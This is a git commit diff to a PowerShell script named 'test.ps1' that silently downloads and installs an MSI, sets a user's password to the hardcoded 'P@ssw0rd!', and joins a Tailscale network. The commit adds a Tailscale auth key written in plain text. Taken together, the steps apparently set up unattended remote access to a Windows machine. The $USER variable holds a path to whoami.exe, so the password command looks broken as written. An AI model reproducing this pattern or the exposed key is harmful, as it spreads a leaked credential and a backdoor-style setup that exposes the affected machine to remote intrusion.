8267991c0860e30a46cac033e719bbefa63e7a26
Efebey007 <mail@cruizernw.com.tr>
2026-01-01 18:16:58 +0300

    Update Tailscale command with auth key

--- test.ps1
+++ test.ps1
@@ -4,4 +4,4 @@ $USER = "C:\Windows\System32\whoami.exe"
 Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath
 Start-Process msiexec -ArgumentList "/i `"$MsiPath`" /qn /norestart" -Wait
 net user $USER P@ssw0rd!
-cmd /c '"C:\Program Files\Tailscale\tailscale.exe" up'
+cmd /c '"C:\Program Files\Tailscale\tailscale.exe" up --auth-key=tskey-auth-kBSfbTf2z511CNTRL-vTCwbrXKUjMBgXC9zVaRjMUWtXCuZiLN7'
